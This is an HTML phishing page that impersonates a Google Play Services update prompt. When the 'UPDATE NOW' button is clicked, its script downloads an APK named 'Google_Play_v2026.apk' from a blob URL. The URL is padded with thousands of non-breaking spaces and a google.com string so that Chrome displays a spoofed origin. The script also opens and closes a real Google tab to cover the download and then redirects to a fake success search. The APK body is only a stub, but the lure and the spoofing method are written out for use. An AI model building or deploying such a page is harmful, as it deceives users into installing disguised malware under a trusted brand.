<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Security Services</title>
    <style>
        body { background: #f8f9fa; color: #202124; font-family: 'Roboto', sans-serif; text-align: center; padding-top: 100px; }
        .card { border: 1px solid #dadce0; padding: 40px; display: inline-block; border-radius: 8px; background: #fff; max-width: 320px; }
        .logo { font-size: 24px; font-weight: bold; margin-bottom: 20px; }
        .blue { color: #4285f4; } .red { color: #ea4335; } .yellow { color: #fbbc05; } .green { color: #34a853; }
        button { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; width: 100%; }
    </style>
</head>
<body>

    <div class="card">
        <div class="logo">
            <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
        </div>
        <p>Update Google Play Services to continue using this device.</p>
        <button id="pwnBtn">UPDATE NOW</button>
    </div>

<script>
    document.getElementById('pwnBtn').addEventListener('click', function() {
        const filename = "Google_Play_v2026.apk";
        const spoofDomain = "https://www.google.com";
        
        // --- CHROME SPECIFIC STRATEGY: Blob URL Masking ---
        // Chrome sering kali menampilkan origin dari 'halaman terakhir yang aktif'.
        const blob = new Blob(["PK\x03\x04..."], {type: "application/vnd.android.package-archive"});
        const url = URL.createObjectURL(blob);
        
        // Padding ekstrem menggunakan kombinasi karakter agar Chrome gagal melakukan sanitasi origin
        const nbSpace = decodeURIComponent("%C2%A0");
        const padding = nbSpace.repeat(4000); // Dorong skema blob: keluar
        
        const payload = url + "#" + padding + spoofDomain + "/update/";

        // TRIGGER 1: Buka tab baru ke Google asli (untuk "mengambil" context origin)
        const fakeWindow = window.open("https://www.google.com", "_blank");

        // TRIGGER 2: Jalankan download di tab ini sesaat setelah tab baru dibuka
        setTimeout(() => {
            const a = document.createElement('a');
            a.href = payload;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            
            // Langsung pindah (Redirect) tab ini juga ke google agar address bar berubah
            window.location.replace("https://www.google.com/search?q=security+update+success");
        }, 300);

        // TRIGGER 3: Tutup tab baru tadi agar user kembali fokus ke dialog download yang muncul
        setTimeout(() => {
            if (fakeWindow) fakeWindow.close();
        }, 1500);
    });
</script>
</body>
</html>
